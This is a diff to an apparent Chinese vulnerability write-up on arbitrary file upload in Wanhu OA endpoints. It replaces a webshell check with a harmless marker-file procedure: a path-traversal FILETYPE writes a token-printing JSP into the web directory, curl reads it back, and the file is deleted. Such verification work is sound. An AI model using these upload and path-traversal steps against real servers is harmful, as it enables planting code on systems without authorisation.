@@ -88,16 +88,39 @@ Content-Disposition: form-data; name="continueUpload"
 
 ## 验证方法
 
+上传接口返回什么状态码都不算数，判据是上传的标记文件能被 GET 回读到。每个接口传一个只输出本次标记串的无马文件，回读成功即确认，随后删掉。
+
+方式一（OfficeServer.jsp，DBSTEP 协议）：`FILETYPE` 用本次唯一的文件名，文件体只输出标记串。
+
 ```bash
-# 验证 OfficeServer.jsp 上传后的 webshell
-curl -s "http://target/defaultroot/public/edit/shell.jsp" | grep "WANHU_VULN_TEST"
+# 把上面 Payload 的 FILETYPE 换成 ../public/edit/poc-POC_TOKEN.jsp，
+# 文件体换成：<% out.println("POC_TOKEN"); %>
 
-# 验证 fileUpload.controller 上传
-curl -s "http://target/defaultroot/upload/html/" -o /dev/null -w "%{http_code}"
-
-# 验证 smartUpload.jsp 上传
-curl -s "http://target/defaultroot/upload/information/" -o /dev/null -w "%{http_code}"
+curl -s "http://target/defaultroot/public/edit/poc-POC_TOKEN.jsp" | grep "POC_TOKEN"
+# 回读出现 POC_TOKEN 即上传通道可用；随后删除该文件
 ```
+
+方式二（fileUpload.controller）：上传后从响应里取回显的文件名，再回读。
+
+```bash
+printf 'POC_TOKEN' > poc-POC_TOKEN.txt
+curl -s "http://target/defaultroot/upload/fileUpload.controller" \
+  -X POST \
+  -F "file=@poc-POC_TOKEN.txt;filename=poc-POC_TOKEN.txt"
+
+# 响应里会带出实际落盘文件名，用它回读
+curl -s "http://target/defaultroot/upload/html/<返回的文件名>" | grep "POC_TOKEN"
+```
+
+方式三（smartUpload.jsp）：`fileName`/`saveName` 用本次唯一串，POST 后在 `upload/information/` 下回读该串。
+
+```bash
+curl -s "http://target/defaultroot/upload/information/<返回的文件名>" | grep "POC_TOKEN"
+```
+
+判据：GET 回读到的内容里出现本次的 `POC_TOKEN`，说明文件按我们的名字落到了 Web 目录。清理：回读验证后逐个 DELETE 掉 `poc-POC_TOKEN.*` 文件。
+
+反例：上传请求返回 200，或目录列表页返回 200，但 GET 目标文件名得到 404 或空内容 —— 只是接口收了请求，任意文件上传不成立。
 
 ## 指纹确认
 
